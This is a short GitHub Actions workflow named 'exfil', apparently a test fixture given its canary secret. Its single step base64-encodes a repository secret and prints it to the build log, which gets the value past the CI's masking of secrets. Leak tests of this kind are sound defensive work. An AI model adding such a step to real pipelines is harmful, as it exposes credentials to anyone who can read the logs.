name: exfil
on:
  push:
    branches: [main]
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - name: leak
        run: echo "CANARY_B64=$(printf %s \"$SECRET\" | base64 -w0)"
        env:
          SECRET: ${{ secrets.CANARY_SECRET }}
